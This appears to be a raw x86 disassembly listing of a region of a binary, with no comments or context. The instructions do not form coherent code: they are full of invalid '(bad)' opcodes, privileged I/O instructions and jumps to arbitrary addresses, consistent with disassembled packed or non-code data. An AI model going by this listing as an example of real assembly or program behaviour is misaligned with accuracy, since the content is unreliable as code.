  408a7a:	xchg   DWORD PTR [ecx],ecx
  408a7c:	inc    esi
  408a7d:	dec    ecx
  408a7e:	lock clc 
  408a80:	icebp  
  408a81:	jg     0x408a43
  408a83:	cld    
  408a84:	push   ss
  408a85:	mov    bl,0x77
  408a87:	es pop ss
  408a89:	push   cs
  408a8a:	push   edi
  408a8b:	sub    BYTE PTR [esi-0x187c95b0],al
  408a91:	ins    DWORD PTR es:[edi],dx
  408a92:	dec    ebx
  408a93:	add    cl,BYTE PTR [esi]
  408a95:	pop    edi
  408a96:	fbstp  TBYTE PTR ds:0x92603cc
  408a9c:	sub    eax,0x62c80bde
  408aa1:	paddsb mm4,QWORD PTR [ebx-0x7c401fdb]
  408aa8:	sbb    eax,0xc8d5bcef
  408aad:	mov    ecx,0xf8933876
  408ab2:	push   esp
  408ab3:	mov    bh,0x66
  408ab5:	stos   BYTE PTR es:[edi],al
  408ab6:	das    
  408ab7:	xor    BYTE PTR [ebx-0x39ee3484],0x31
  408abe:	inc    ebp
  408abf:	inc    eax
  408ac0:	jl     0x408afa
  408ac2:	test   BYTE PTR [eax+ebp*2],ah
  408ac5:	mov    ds:0x4519facf,al
  408aca:	or     BYTE PTR [esi-0x5a],dl
  408acd:	addr16 and ch,bh
  408ad0:	pushf  
  408ad1:	mov    ds:0xf48b8ef5,eax
  408ad6:	out    0x55,al
  408ad8:	ror    DWORD PTR [eax-0x60],cl
  408adb:	push   es
  408adc:	push   ebx
  408add:	cmp    eax,0x7de9bf2a
  408ae2:	fwait
  408ae3:	shl    BYTE PTR [ebx-0x68d5221c],cl
  408ae9:	out    0xc8,eax
  408aeb:	cdq    
  408aec:	jmp    0x464aa904
  408af1:	mov    dh,0xbb
  408af3:	xor    edi,DWORD PTR [ebx+0x24d15063]
  408af9:	inc    esi
  408afa:	xor    DWORD PTR [ecx-0x480d9658],edx
  408b00:	stos   DWORD PTR es:[edi],eax
  408b01:	or     al,0x3b
  408b03:	xchg   DWORD PTR [ebx-0x3a],esi
  408b06:	mov    ds:0xed4b13cd,eax
  408b0b:	pushf  
  408b0c:	xchg   ebp,eax
  408b0d:	jb     0x408b79
  408b0f:	pop    ss
  408b10:	data16 je 0x408b26
  408b13:	or     ch,BYTE PTR ds:0x154e9b1b
  408b19:	(bad)  
  408b1a:	cwde   
  408b1b:	popa   
  408b1c:	cmp    BYTE PTR [edx],ah
  408b1e:	addr16 ss mov ebp,0xe9231daf
  408b25:	bswap  esp
  408b27:	and    DWORD PTR [ebx+edx*1-0x59],edi
  408b2b:	int3   
  408b2c:	lods   eax,DWORD PTR ds:[esi]
  408b2d:	popfw  
  408b2f:	ja     0x408b3c
  408b31:	iret   
  408b32:	nop
  408b33:	sti    
  408b34:	pop    ebp
  408b35:	pop    ebp
  408b36:	jmp    0xe73:0x2c05b97
  408b3d:	push   0xdb9efbff
  408b42:	xchg   ecx,eax
  408b43:	mov    esi,0x6dbe97f4
  408b48:	(bad)  
  408b49:	hlt    
  408b4a:	in     eax,dx
  408b4b:	les    ebx,FWORD PTR [edi]
  408b4d:	ins    BYTE PTR es:[edi],dx
  408b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b4f:	xor    DWORD PTR [edx],edx
  408b51:	cs or  esp,0xffffffbe
  408b55:	fisub  DWORD PTR [edi+0x7a91845b]
  408b5b:	ss push ecx
  408b5d:	jg     0x408b03
  408b5f:	add    eax,0x84f8fd16
  408b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b65:	adc    BYTE PTR [ebp-0x373fc81e],al
  408b6b:	shl    BYTE PTR [edx+0x1db71961],0x36
  408b72:	pop    edi
  408b73:	test   cl,ah
  408b75:	repnz scas eax,DWORD PTR es:[edi]
  408b77:	loope  0x408b5c
  408b79:	sub    DWORD PTR [esi],ecx
  408b7b:	inc    esp
  408b7c:	aad    0xe7
  408b7e:	aad    0x2
  408b80:	pop    edi
  408b81:	fwait
  408b82:	fwait
  408b83:	into   
  408b84:	xchg   ecx,eax
  408b85:	data16 (bad) ds:0x2a5cc277
  408b8c:	adc    eax,0xf98b9bfb
  408b91:	sub    ebp,ebx
  408b93:	jl     0x408bfd
  408b95:	ins    BYTE PTR es:[edi],dx
  408b96:	sahf   
  408b97:	jnp    0x408c0f
  408b99:	aas    
  408b9a:	mov    al,ds:0xd89215a1
  408b9f:	(bad)  
  408ba1:	outs   dx,BYTE PTR ds:[esi]
  408ba2:	adc    dl,bh
  408ba4:	pop    ds
  408ba5:	push   0xfffffff7
  408ba7:	jo     0x408b73
  408ba9:	and    ecx,DWORD PTR [ebp*2+0x61eb5a04]
  408bb0:	pusha  
  408bb1:	les    ebx,FWORD PTR [edx+0x2e]
  408bb4:	mov    ch,0x10
  408bb6:	mov    eax,ds:0x2e42cec8
  408bbb:	inc    edx
  408bbc:	xchg   edi,eax
  408bbd:	pop    edi
  408bbe:	ss imul ebp,esp,0x8770572e
  408bc5:	fistp  WORD PTR [edi+0x2d21bcf8]
  408bcb:	(bad)  [ecx+0x66]
  408bce:	ja     0x408c10
  408bd0:	pop    ss
  408bd1:	mov    ?,WORD PTR [ebp-0x11]
  408bd4:	xor    BYTE PTR [edi],bl
  408bd6:	imul   ebx,DWORD PTR [edi-0x6f],0xcc4710ef
  408bdd:	cmp    eax,0x276ad54a
  408be2:	mov    ah,0xdf
  408be4:	push   ds
  408be5:	ja     0x408beb
  408be7:	sub    eax,0xf85504dd
  408bec:	les    ecx,FWORD PTR [edi-0xf]
  408bef:	clc    
  408bf0:	jo     0x408c19
  408bf2:	(bad)  
  408bf4:	out    0x6b,eax
  408bf6:	add    dh,bh
  408bf8:	add    bl,bh
  408bfa:	bound  ebp,QWORD PTR es:[esi]
  408bfd:	sbb    ebp,DWORD PTR [ecx]
  408bff:	and    esi,ebx
  408c01:	(bad)  
  408c02:	fwait
  408c03:	sbb    ebx,ebx
  408c05:	dec    esi
  408c06:	and    BYTE PTR [esp+esi*2-0x28],0xad
  408c0b:	(bad)  
  408c0c:	mov    eax,0x8a26166e
  408c11:	sbb    al,BYTE PTR [eax]
  408c13:	mov    ds:0x2d911a7a,eax
  408c18:	outs   dx,DWORD PTR ds:[esi]
  408c19:	es mov al,0xc1
  408c1c:	xchg   ecx,eax
  408c1d:	(bad)
  408c22:	sbb    BYTE PTR [esi-0x13],ch
  408c25:	mov    ch,0x65
  408c27:	fisttp QWORD PTR [eax+0x2e4e234e]
  408c2d:	pop    ebp
  408c2e:	or     cl,BYTE PTR ds:0x8b14e63e
  408c34:	test   eax,0x3444b393
  408c39:	call   0x2fdca4e2
  408c3e:	xlat   BYTE PTR ds:[ebx]
  408c3f:	cmp    DWORD PTR [edi+eiz*4-0x68],edi
  408c43:	pusha  
  408c44:	push   ebp
  408c45:	ret    0x8e66
  408c48:	(bad)  
  408c49:	ret    
  408c4a:	adc    ecx,DWORD PTR [eax-0x3c4479f3]
  408c50:	pop    ebx
  408c51:	xchg   esp,eax
  408c52:	or     BYTE PTR [ebp-0x38ce6de0],ch
  408c58:	and    eax,0xca40317a
  408c5d:	sbb    edx,DWORD PTR [edi-0x5a71252e]
  408c63:	test   eax,0x9501efd8
  408c68:	mov    bl,0xd6
  408c6a:	rcr    DWORD PTR [ecx-0x3c],cl
  408c6d:	dec    esi
  408c6e:	dec    eax
  408c6f:	xchg   edi,eax
  408c70:	sbb    eax,0xe5432372
  408c75:	leave  
  408c76:	push   cs
  408c77:	aaa    
  408c78:	and    cl,BYTE PTR [edx+0x3b]
  408c7b:	xor    cl,BYTE PTR [edx-0x14375890]
  408c81:	sbb    BYTE PTR [ecx],dl
  408c83:	(bad)  
  408c84:	pop    esp
  408c85:	mov    eax,gs
  408c87:	mov    fs,WORD PTR [ecx-0x1b6a9ba1]
  408c8d:	into   
  408c8e:	pushf  
  408c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c90:	mov    cl,0xca
  408c92:	mov    eax,ds:0x1dd33bf5
  408c97:	dec    edx
  408c98:	out    dx,al
  408c99:	pop    eax
  408c9a:	jno    0x408c85
  408c9c:	mov    ecx,0x2c36d647
  408ca1:	mov    dh,0x44
  408ca3:	pop    edx
  408ca4:	dec    esp
  408ca5:	imul   ebx,DWORD PTR [ebp-0x62d856be],0xca548195
  408caf:	mov    ds:0xbc03e8d8,eax
  408cb4:	add    cl,BYTE PTR [esi+0x16f0500e]
  408cba:	outs   dx,BYTE PTR ds:[esi]
  408cbb:	dec    eax
  408cbc:	loop   0x408cce
  408cbe:	fstp   TBYTE PTR [ebx-0x68]
  408cc1:	shl    ecx,1
  408cc3:	loop   0x408c71
  408cc5:	pop    edi
  408cc6:	xchg   edi,eax
  408cc7:	shr    DWORD PTR [ebp-0x4e],0x83
  408ccb:	or     DWORD PTR [ebp-0x44],esp
  408cce:	and    eax,0x68840bbf
  408cd3:	and    esp,DWORD PTR [ebp+0x34]
  408cd6:	sbb    al,0xef
  408cd8:	retf   
  408cd9:	retf   
  408cda:	add    al,0x47
  408cdc:	mov    eax,ds:0xef3d14fb
  408ce1:	dec    eax
  408ce2:	or     DWORD PTR [esi],ebp
  408ce4:	xlat   BYTE PTR ds:[ebx]
  408ce5:	or     al,0x13
  408ce7:	adc    BYTE PTR [ebp-0xc],ch
  408cea:	fcmove st,st(6)
  408cec:	(bad)  
  408ced:	lods   al,BYTE PTR ds:[esi]
  408cee:	xor    dh,ch
  408cf0:	jle    0x408d51
  408cf2:	add    eax,0x73f69d16
  408cf7:	popa   
  408cf8:	or     esp,DWORD PTR [edx+0x5]
  408cfb:	push   0x36
  408cfd:	mov    ah,0xd7
  408cff:	mov    es:0xbb252303,eax
  408d05:	jno    0x408cd3
  408d07:	mov    ds:0x2e9c86e2,al
  408d0c:	add    BYTE PTR [eax+ebp*4],0xe
  408d10:	movlps QWORD PTR ds:0x68f76032,xmm0
  408d17:	daa    
  408d18:	jecxz  0x408d03
  408d1a:	xor    BYTE PTR [ecx-0x41f300ca],bh
  408d20:	stos   BYTE PTR es:[edi],al
  408d21:	mov    ds:0x1aed94dc,al
  408d26:	sub    DWORD PTR [eax-0x17],ebp
  408d29:	jmp    0x408d57
  408d2b:	add    eax,0xed1be9f4
  408d30:	or     eax,0xe1a97930
  408d35:	inc    eax
  408d36:	pop    ds
  408d37:	jge    0x408d42
  408d39:	and    al,0x3e
  408d3b:	push   esp
  408d3c:	sub    al,0xf5
  408d3e:	mov    ebx,0x6a5a5e5b
  408d43:	cdq    
  408d44:	adc    eax,DWORD PTR [ebp+0x4e57c022]
  408d4a:	add    al,0x98
  408d4c:	xor    edx,esp
  408d4e:	mov    dl,BYTE PTR [ecx+ecx*8-0x1d]
  408d52:	cmp    eax,0xf3a59e74
  408d57:	pop    ecx
  408d58:	shl    cl,0x3e
  408d5b:	jnp    0x408dd1
  408d5d:	out    dx,eax
  408d5e:	or     eax,0x3ac49f5c
  408d63:	pop    ebx
  408d64:	sub    ebp,DWORD PTR [eax+0x50]
  408d67:	std    
  408d68:	cli    
  408d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d6a:	xor    ebx,DWORD PTR [esi+0x1c]
  408d6d:	jmp    esi
  408d6f:	popa   
  408d70:	xacquire xchg BYTE PTR [ebp-0x33],al
  408d74:	jne    0x408d9d
  408d76:	ins    BYTE PTR es:[edi],dx
  408d77:	retf   0x3f41
  408d7a:	pusha  
  408d7b:	adc    al,dl
  408d7d:	add    al,0xb3
  408d7f:	test   BYTE PTR [eax+0x4b],dh
  408d82:	ret    
  408d83:	idiv   DWORD PTR [ebx-0x22be920a]
  408d89:	fs pushf 
  408d8b:	(bad)  
  408d8d:	or     eax,0xe976a0b9
  408d92:	xor    eax,0x82252acf
  408d97:	cmp    eax,0x496738c4
  408d9c:	ror    DWORD PTR [eax-0x3b],cl
  408d9f:	stos   BYTE PTR es:[edi],al
  408da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408da1:	add    BYTE PTR [eax+0x7a],dh
  408da4:	sbb    al,0x6d
  408da6:	xchg   edi,eax
  408da7:	jecxz  0x408e23
  408da9:	addr16 cdq 
  408dab:	sub    bl,ah
  408dad:	jno    0x408db9
  408daf:	sbb    dh,BYTE PTR [eax+0x52eb994e]
  408db5:	mov    esi,0xd25bfaba
  408dba:	dec    ecx
  408dbb:	xchg   DWORD PTR [edx+0x74],esi
  408dbe:	sub    BYTE PTR [ebx-0x38c8c01f],al
  408dc4:	retf   0x7d9a
  408dc7:	sbb    eax,0x649e3e42
  408dcc:	int3   
  408dcd:	stc    
  408dce:	test   ebp,esp
  408dd0:	jle    0x408d62
  408dd2:	sub    DWORD PTR [ecx+0x3fc96465],0x12def1d6
  408ddc:	fcomp  DWORD PTR [eax]
  408dde:	jecxz  0x408df8
  408de0:	icebp  
  408de1:	sbb    al,0x45
  408de3:	fisub  DWORD PTR [edx+0x45d524cc]
  408de9:	out    dx,eax
  408dea:	(bad)  
  408dec:	push   esi
  408ded:	test   BYTE PTR [edx-0x1],dl
  408df0:	pop    ss
  408df1:	pop    es
  408df2:	pop    esp
  408df3:	aaa    
  408df4:	jns    0x408ddb
  408df6:	jnp    0x408ddd
  408df8:	jno    0x408dad
  408dfa:	stos   DWORD PTR es:[edi],eax
  408dfb:	in     eax,dx
  408dfc:	dec    eax
  408dfd:	fdivr  DWORD PTR [esi]
  408dff:	outs   dx,DWORD PTR ds:[esi]
  408e00:	popf   
  408e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e02:	or     ebp,eax
  408e04:	imul   BYTE PTR [edx-0x51]
  408e07:	pop    ebx
  408e08:	ror    bl,0x81
  408e0b:	mov    dh,BYTE PTR [eax]
  408e0d:	test   BYTE PTR [edx-0x33],cl
  408e10:	xchg   ebp,eax
  408e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e12:	pop    esp
  408e13:	cmp    al,BYTE PTR [eax+0x2c]
  408e16:	cmp    eax,0x7dbba718
  408e1b:	aas    
  408e1c:	into   
  408e1d:	inc    esi
  408e1e:	ret    0xd781
  408e21:	add    al,0x94
  408e23:	cmp    esp,DWORD PTR [ebx]
  408e25:	inc    ebx
  408e26:	jae    0x408e56
  408e28:	(bad)  
  408e29:	mov    ch,0x3a
  408e2b:	out    dx,eax
  408e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e2d:	and    eax,0x7cbe081d
  408e32:	mov    esp,0x4034e36f
  408e37:	xchg   esi,eax
  408e38:	nop
  408e39:	mov    ah,0x7f
  408e3b:	jbe    0x408ead
  408e3d:	shr    DWORD PTR [esi+ebp*4-0x3d46b272],cl
  408e44:	push   ds
  408e45:	mov    ecx,0x74bfaeb4
  408e4a:	cld    
  408e4b:	and    BYTE PTR ss:[esp+eiz*4+0x40],0xef
  408e51:	jb     0x408df3
  408e53:	jl     0x408ec7
  408e55:	and    DWORD PTR [edx-0x34],esi
  408e58:	cmp    eax,0x623c2980
  408e5d:	cmp    BYTE PTR [eax+0x76],al
  408e60:	stc    
  408e61:	mov    al,BYTE PTR [esp+edi*1]
  408e64:	in     eax,0xb0
  408e66:	int    0xa2
  408e68:	mov    al,ds:0xa4f4f460
  408e6d:	in     eax,0x34
  408e6f:	aam    0x99
  408e71:	cmp    edi,DWORD PTR [ebp-0x7e961af8]
  408e77:	push   ecx
  408e78:	into   
  408e79:	mov    bl,0x83
  408e7b:	sar    DWORD PTR [edi-0x79],0xc9
  408e7f:	add    BYTE PTR [ebx+0x2e],dl
  408e82:	push   edi
  408e83:	mov    esp,0xeec32b4a
  408e88:	add    al,0xe8
  408e8a:	call   0xdd0c3aa6
  408e8f:	leave  
  408e90:	fist   DWORD PTR [ecx+ebp*8+0x77bb6b91]
  408e97:	fwait
  408e98:	(bad)  
  408e99:	pop    edi
  408e9a:	xor    esi,0xaed025c0
  408ea0:	lock stos BYTE PTR es:[edi],al
  408ea2:	jmp    0xc4c8cc58
  408ea7:	dec    edi
  408ea8:	fwait
  408ea9:	mov    ds:0xc4c9872,eax
  408eae:	fsubr  DWORD PTR [edx+0x5ff191c2]
  408eb4:	pop    ecx
  408eb5:	adc    edx,DWORD PTR [ecx-0x56db22a6]
  408ebb:	pop    ecx
  408ebc:	add    eax,0x8018e69b
  408ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ec2:	fsubr  DWORD PTR ds:0xc0805ab6
  408ec8:	retf   0x9db4
  408ecb:	rep stos DWORD PTR es:[edi],eax
  408ecd:	(bad)  
  408ece:	ror    BYTE PTR [eax],cl
  408ed0:	ds jnp 0x408e86
  408ed3:	jb     0x408f02
  408ed5:	es pop ebp
  408ed7:	mov    edx,0xc833a485
  408edc:	in     al,0xe6
  408ede:	call   0xe33a1b46
  408ee3:	ret    0x1df6
  408ee6:	adc    al,0x30
  408ee8:	loopne 0x408f1c
  408eea:	push   esp
  408eeb:	xor    ebp,edx
  408eed:	mov    ebp,0xb36a9c36
  408ef2:	jae    0x408eca
  408ef4:	sbb    al,0xdf
  408ef6:	push   ebx
  408ef7:	test   DWORD PTR [esi-0x9],esp
  408efa:	sahf   
  408efb:	addr16 cmp bl,bl
  408efe:	mov    ch,0xd3
  408f00:	arpl   WORD PTR [ebp-0x24d93f0a],bp
  408f06:	out    0x82,eax
  408f08:	sahf   
  408f09:	mov    ch,0x58
  408f0b:	retf   0xb42e
  408f0e:	das    
  408f0f:	repnz push esp
  408f11:	sub    al,0x5
  408f13:	mov    al,ds:0x1525bf2f
  408f18:	mov    WORD PTR ds:0x8023505f,?
  408f1e:	stc    
  408f1f:	call   0x1f44:0x642d8380
  408f26:	scas   eax,DWORD PTR es:[edi]
  408f27:	inc    esi
  408f28:	mov    ecx,0xca1cc882
  408f2d:	stos   DWORD PTR es:[edi],eax
  408f2e:	leave  
  408f2f:	inc    esp
  408f30:	sti    
  408f31:	and    bh,BYTE PTR [esi-0x56]
  408f34:	(bad)  
  408f36:	and    cl,cl
  408f38:	adc    edx,DWORD PTR [eax]
  408f3a:	inc    ebx
  408f3b:	push   cs
  408f3c:	push   ds
  408f3d:	pushf  
  408f3e:	cli    
  408f3f:	rol    BYTE PTR [edx+edx*8-0x7c6641f1],1
  408f46:	xchg   BYTE PTR [esi+0xcdf3a92],dh
  408f4c:	cld    
  408f4d:	out    dx,al
  408f4e:	pop    ecx
  408f4f:	mov    ebp,0xfee9fce4
  408f54:	xchg   esp,eax
  408f55:	repnz imul ecx,edx,0x61
  408f59:	clc    
  408f5a:	int    0xa2
  408f5c:	into   
  408f5d:	cmp    al,0x5f
  408f5f:	aaa    
  408f60:	add    eax,esi
  408f62:	clc    
  408f63:	jl     0x408f90
  408f65:	push   ss
  408f66:	inc    ebx
  408f67:	and    BYTE PTR [edx],dh
  408f69:	aaa    
  408f6a:	cdq    
  408f6b:	jnp    0x408f51
  408f6d:	scas   al,BYTE PTR es:[edi]
  408f6e:	sub    dl,BYTE PTR [edx+0x36b79082]
  408f74:	mov    ch,cl
  408f76:	outs   dx,DWORD PTR ds:[esi]
  408f77:	mov    ebx,0x72cb3217
  408f7c:	inc    esi
  408f7d:	inc    ecx
  408f7e:	sub    edx,ebx
  408f80:	pop    ebx
  408f81:	pushf  
  408f82:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  408f84:	push   edi
  408f85:	dec    eax
  408f86:	inc    edx
  408f87:	jns    0x408fd6
  408f89:	in     al,dx
  408f8a:	mov    dh,0x90
  408f8c:	xchg   edx,eax
  408f8d:	mov    edi,0x5521e2f3
  408f92:	pop    ebp
  408f93:	mov    eax,0x71e1bcfa
  408f98:	pop    ecx
  408f99:	rcr    DWORD PTR [ecx+0x54dd88c1],0xa6
  408fa0:	in     al,dx
  408fa1:	mov    ch,0xe
  408fa3:	fisub  DWORD PTR [ebx+eax*4+0x4b6bea9e]
  408faa:	(bad)  
  408fab:	dec    ebp
  408fac:	jns    0x408f64
  408fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408faf:	push   edi
  408fb0:	(bad)  
  408fb1:	mov    ch,0x6c
  408fb3:	sub    ebx,DWORD PTR [edx+0x5b]
  408fb6:	mov    al,ds:0x8b637d45
  408fbb:	mov    al,0x25
  408fbd:	jg     0x408fd1
  408fbf:	cmp    BYTE PTR [edx+0x3a],ch
  408fc2:	jge    0x408f8a
  408fc4:	aaa    
  408fc5:	cld    
  408fc6:	pop    ss
  408fc7:	imul   ebp,DWORD PTR [eax+0x40],0xffffff89
  408fcb:	sbb    eax,0x5d12a0b0
  408fd0:	test   BYTE PTR ds:0xa7dc0453,dl
  408fd6:	ins    DWORD PTR es:[edi],dx
  408fd7:	pop    edi
  408fd8:	jmp    0xdf27:0x35c90b55
  408fdf:	js     0x408f9e
  408fe1:	aad    0x18
  408fe3:	pop    edx
  408fe4:	inc    ebx
  408fe5:	mov    esp,0x2d0af426
  408fea:	adc    DWORD PTR [ecx+0x61],ecx
  408fed:	dec    esp
  408fee:	jae    0x408f8e
  408ff0:	xchg   BYTE PTR [ebx-0x7f2d88be],al
  408ff6:	fnsave [edx-0x18]
  408ff9:	call   0x7b26c6b9
  408ffe:	das    
  408fff:	fnsave [edx+esi*4]
  409002:	sub    ecx,DWORD PTR [esi]
  409004:	(bad)  
  409005:	out    dx,eax
  409006:	test   DWORD PTR [esi+ebx*8-0x30be24e2],eax
  40900d:	std    
  40900e:	jecxz  0x409010
  409010:	push   0x68
  409012:	imul   esi,ebp,0x53f03912
  409018:	xchg   edi,eax
  409019:	jmp    0x5fef:0x875798e8
  409020:	jle    0x408fff
  409022:	fst    QWORD PTR [ecx]
  409024:	xchg   ecx,eax
  409025:	mov    DWORD PTR [eax-0x21849a2e],0x2c99ee22
  40902f:	push   cs
  409030:	clc    
  409031:	loop   0x408fc5
  409033:	or     ch,ah
  409035:	lahf   
  409036:	aaa    
  409037:	push   ds
  409038:	cmp    BYTE PTR [esi-0x38],bh
  40903b:	in     eax,dx
  40903c:	loope  0x409074
  40903e:	sbb    ah,BYTE PTR [eax]
  409040:	aaa    
  409041:	or     al,0x98
  409043:	cwde   
  409044:	neg    BYTE PTR [ebp-0xa9747c0]
  40904a:	xchg   esp,eax
  40904b:	imul   esi,DWORD PTR [edi+ebx*4+0x2a7f7d88],0xd5a868e4
  409056:	sahf   
  409057:	sar    BYTE PTR [ebp-0x558c46d8],0x23
  40905e:	(bad)  
  40905f:	icebp  
  409060:	pop    ebx
  409061:	mov    bl,ch
  409063:	mov    esp,0xf9e4cc9f
  409068:	mov    cl,0x29
  40906a:	mov    bh,0xf6
  40906c:	stos   BYTE PTR es:[edi],al
  40906d:	mov    edx,0xb2b9fb99
  409072:	outs   dx,BYTE PTR ds:[esi]
  409073:	sub    BYTE PTR [ebx-0x57771466],dl
  409079:	dec    eax
  40907a:	and    al,0x59
  40907c:	pusha  
  40907d:	out    0x9,al
  40907f:	call   0xabe2:0x24978ac0
  409086:	mov    dh,0x4e
  409088:	or     dh,dl
  40908a:	push   esi
  40908b:	cmp    eax,0xa5d6fd17
  409090:	pop    ds
  409091:	es dec edi
  409093:	add    bh,cl
  409095:	and    eax,0xf568f6de
  40909a:	sub    BYTE PTR [ebx],0x51
  40909d:	sti    
  40909e:	in     al,dx
  40909f:	cdq    
  4090a0:	add    ch,BYTE PTR [ecx+0x4b]
  4090a3:	lods   al,BYTE PTR gs:[esi]
  4090a5:	fistp  DWORD PTR [edx+0x6d]
  4090a8:	pop    eax
  4090a9:	std    
  4090aa:	jg     0x4090c4
  4090ac:	push   ecx
  4090ad:	jp     0x40907a
  4090af:	scas   eax,DWORD PTR es:[edi]
  4090b0:	ficomp DWORD PTR [esi]
  4090b2:	icebp  
  4090b3:	call   0xba978de9
  4090b8:	daa    
  4090b9:	mov    ebp,0x46df8135
  4090be:	sub    ebx,DWORD PTR [edx-0x4e7410f8]
  4090c4:	add    edx,DWORD PTR [edi-0x1a12086e]
  4090ca:	mov    esp,0x7e68ee62
  4090cf:	jmp    0x409103
  4090d1:	and    bl,bh
  4090d3:	mov    al,0x6a
  4090d5:	fild   DWORD PTR [edx+0x22dded96]
  4090db:	(bad)  [eax-0x1]
  4090de:	popf   
  4090df:	cs enter 0xd60f,0x9c
  4090e4:	mov    dh,0x20
  4090e6:	push   eax
  4090e7:	dec    ecx
  4090e8:	mov    esp,0xc6dab235
  4090ed:	leave  
  4090ee:	inc    esi
  4090ef:	int    0x2
  4090f1:	push   0x664a0408
  4090f6:	dec    esp
  4090f7:	in     eax,0x7f
  4090f9:	adc    eax,0xe20aed90
  4090fe:	pushf  
  4090ff:	clc    
  409100:	cdq    
  409101:	mov    ch,0x6f
  409103:	pusha  
  409104:	mov    cl,0xd1
  409106:	xor    eax,0x78cb100a
  40910b:	outs   dx,DWORD PTR ds:[esi]
  40910c:	dec    eax
  40910d:	sbb    al,0x51
  40910f:	push   esp
  409110:	add    BYTE PTR [ebx+0x18a546a8],0x5d
  409117:	dec    ebp
  409118:	xchg   esi,eax
  409119:	xor    BYTE PTR [eax+0x55],bh
  40911c:	repz xchg edx,eax
  40911e:	push   esp
  40911f:	fidivr WORD PTR [edx]
  409121:	outs   dx,BYTE PTR ds:[esi]
  409122:	icebp  
  409123:	cs cmp al,0x51
  409126:	or     edx,ecx
  409128:	xlat   BYTE PTR ds:[ebx]
  409129:	add    eax,0xe2c01632
  40912e:	out    0x1b,al
  409130:	dec    edx
  409131:	cs (bad) 
  409133:	out    0x9f,al
  409135:	mov    dh,0xe9
  409137:	and    BYTE PTR [edi-0x55],ch
  40913a:	adc    edx,DWORD PTR [ecx-0x79ba21d4]
  409140:	outs   dx,BYTE PTR ds:[esi]
  409141:	aas    
  409142:	mov    al,ds:0x1727d35a
  409147:	jecxz  0x4091a2
  409149:	xchg   edx,eax
  40914a:	push   0x7d221c3c
  40914f:	js     0x4090d3
  409151:	loope  0x40910f
  409153:	test   DWORD PTR [esi],0x943b385f
  409159:	test   eax,0x4d6c5923
  40915e:	fidivr DWORD PTR [ebx+0x76f5b8c9]
  409164:	inc    eax
  409165:	and    BYTE PTR [ebx],ch
  409167:	fwait
  409168:	dec    ebx
  409169:	addr16 aam 0xe9
  40916c:	mov    edx,0xca88a758
  409171:	lahf   
  409172:	fsub   QWORD PTR [ebx-0x27b12a4b]
  409178:	add    eax,0x5140ce4a
  40917d:	lods   al,BYTE PTR ds:[esi]
  40917e:	adc    al,0xc
  409180:	mov    esi,0x3e9b48fb
  409185:	jecxz  0x409183
  409187:	jge    0x4091c6
  409189:	push   0xe89b3250
  40918e:	xchg   edi,esp
  409190:	xor    DWORD PTR [eax],0x79
  409193:	sar    BYTE PTR [ebx],1
  409195:	pop    edx
  409196:	scas   eax,DWORD PTR es:[edi]
  409197:	xchg   esi,eax
  409198:	test   al,0xa9
  40919a:	inc    esp
  40919b:	imul   esp,DWORD PTR [edx-0x53],0xffffffbe
  40919f:	(bad)  
  4091a0:	mov    BYTE PTR [ebx],0x4f
  4091a3:	das    
  4091a4:	leave  
  4091a5:	ja     0x40918d
  4091a7:	adc    eax,ebp
  4091a9:	lods   eax,DWORD PTR ds:[esi]
  4091aa:	inc    esi
  4091ab:	mov    edx,0x797a9b66
  4091b0:	push   ebx
  4091b1:	fwait
  4091b2:	out    dx,eax
  4091b3:	push   esp
  4091b4:	or     eax,esi
  4091b6:	out    dx,al
  4091b7:	mov    ch,0x65
  4091b9:	sub    ebp,esp
  4091bb:	test   DWORD PTR ds:0xd586781a,0x75d99903
  4091c5:	ret    
  4091c6:	or     eax,0xa4f4568
  4091cb:	push   edi
  4091cc:	stc    
  4091cd:	fisub  WORD PTR [esi-0x14963ad0]
  4091d3:	ret    
  4091d4:	sub    al,ah
  4091d6:	fldlg2 
  4091d8:	ins    DWORD PTR es:[edi],dx
  4091d9:	dec    ecx
  4091da:	cmp    cl,BYTE PTR [ebp-0x70856060]
  4091e0:	dec    edx
  4091e1:	sub    DWORD PTR [esi+0x6c],0x31d76e30
  4091e8:	pop    esp
  4091e9:	jo     0x4091a1
  4091eb:	xor    bh,dh
  4091ed:	fbstp  TBYTE PTR [edi+ebx*2-0x37]
  4091f1:	add    BYTE PTR [ebx+ecx*2-0x78],cl
  4091f5:	das    
  4091f6:	or     al,0xac
  4091f8:	sbb    DWORD PTR [esp+edx*2-0x26],ebx
  4091fc:	adc    al,0x69
  4091fe:	(bad)  
  4091ff:	loop   0x40922a
  409201:	call   0x1dfbdb90
  409206:	sub    eax,0x865d9644
  40920b:	mov    esp,0xb2dbb72d
  409210:	popf   
  409211:	sar    BYTE PTR [esi],0x1
  409214:	push   ds
  409215:	sbb    al,0x81
  409217:	dec    ebx
  409218:	outs   dx,BYTE PTR ds:[esi]
  409219:	add    edx,DWORD PTR [ebx+0x34000180]
  40921f:	clc    
  409220:	push   esi
  409221:	mov    cl,0xc2
  409223:	mov    al,0x48
  409225:	mov    bh,0xc2
  409227:	and    DWORD PTR [esi+0x42b603a6],esp
  40922d:	jnp    0x40927a
  40922f:	das    
  409230:	mov    dh,0xb6
  409232:	les    edx,FWORD PTR [edx]
  409234:	jecxz  0x409279
  409236:	fisub  DWORD PTR [edi-0x4a]
  409239:	imul   ebp,edx,0x1d
  40923c:	(bad)  
  40923d:	mov    dh,0xe
  40923f:	sub    al,0xaf
  409241:	jp     0x40921a
  409243:	xor    BYTE PTR [eax],0xbe
  409246:	pop    ss
  409247:	push   ds
  409248:	mov    edi,0x136e476b
  40924d:	sbb    esi,esp
  40924f:	add    ebp,DWORD PTR [ebx+esi*1-0x7b05422d]
  409256:	pop    ss
  409257:	sahf   
  409258:	add    BYTE PTR ds:0x891ec6c6,ch
  40925e:	push   ss
  40925f:	add    al,0x3c
  409261:	sahf   
  409262:	jle    0x409284
